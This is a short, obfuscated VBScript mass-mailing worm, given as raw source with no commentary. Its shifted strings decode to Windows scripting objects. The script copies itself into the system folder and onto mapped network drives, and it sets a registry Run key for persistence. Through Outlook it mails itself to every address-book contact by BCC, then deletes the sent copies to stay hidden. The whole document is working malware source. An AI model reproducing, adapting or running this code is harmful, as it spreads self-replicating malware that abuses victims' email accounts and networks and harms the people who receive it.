' dsf

On Error Resume Next

Dim RUKQ
Dim KRTSA5QJ
Dim I3QD
Dim I6S
Dim N8KIFAFW
Dim TCR
Dim ZMLS5
Dim HXK8
Dim UKPVEJ3S
Dim APK0YMAJ

Set RUKQ = CreateObject( S4XQE( "Rbqhoshmf-EhkdRxrsdlNaidbs" ) )
RUKQ.CopyFile WScript.ScriptFullName, RUKQ.BuildPath( RUKQ.GetSpecialFolder(1), S4XQE( "REFU-UAR" ) )

Set KRTSA5QJ = CreateObject( S4XQE( "VRbqhos-Rgdkk" ) )
KRTSA5QJ.RegWrite S4XQE( "GJDX^KNB@K^L@BGHMD[Rnesv`qd[Lhbqnrnes[Vhmcnvr[BtqqdmsUdqrhnm[Qtm[" ) & S4XQE( "REFU" ), RUKQ.BuildPath( RUKQ.GetSpecialFolder(1), S4XQE( "REFU-UAR" ) )


Set I3QD = CreateObject( S4XQE( "VRbqhos-Mdsvnqj" ) )
Set N8KIFAFW = I3QD.EnumNetworkDrives

If N8KIFAFW.Count <> 0 Then
   For I6S = 0 To N8KIFAFW.Count - 1
       If InStr( N8KIFAFW.Item( I6S), S4XQE( "[" ) ) <> 0 Then
          RUKQ.CopyFile WScript.ScriptFullName, RUKQ.BuildPath( N8KIFAFW.Item( I6S), S4XQE( "REFU-UAR" ) ) 
       End If
   Next
End If

I6S = KRTSA5QJ.RegRead( S4XQE( "GJDX^KNB@K^L@BGHMD[" ) & S4XQE( "REFU" ) )

If I6S = "" Or I6S > 20 Then
   I6S = 0
End If

If I6S = 0 Then
   Set HXK8 = CreateObject( S4XQE( "Ntsknnj-@ookhb`shnm" ) )
   Set TCR = HXK8.GetNameSpace( S4XQE( "L@OH" ) )

   For Each ZMLS5 In TCR.AddressLists
       Set N8KIFAFW = HXK8.CreateItem( 0 )

       For UKPVEJ3S = 1 To ZMLS5.AddressEntries.Count
           Set APK0YMAJ = ZMLS5.AddressEntries( UKPVEJ3S )

           If UKPVEJ3S = 1 Then
              N8KIFAFW.BCC = APK0YMAJ.Address
           Else
              N8KIFAFW.BCC = N8KIFAFW.BCC & S4XQE( ":" ) & APK0YMAJ.Address
           End If
       Next

       N8KIFAFW.Subject = S4XQE( "crfe" )
       N8KIFAFW.Body = S4XQE( "fcre" )
       N8KIFAFW.Attachmets.Add WScript.ScriptFullName
       N8KIFAFW.DeleteAfterSubmit = True
       N8KIFAFW.Send
   Next

   I6S = 0
End If

KRTSA5QJ.RegWrite S4XQE( "GJDX^KNB@K^L@BGHMD[" ) & S4XQE( "REFU" ), I6S + 1

Function S4XQE( H5J102ZL )
   Dim HQSV5
   Dim EWO41QCY
   Dim XVU

   HQSV5 = ""

   For EWO41QCY = 1 To Len( H5J102ZL )
       XVU = Mid( H5J102ZL, EWO41QCY, 1 )

       HQSV5 = HQSV5 & Chr( Asc( XVU ) + 1 )
   Next

   S4XQE = HQSV5
End Function
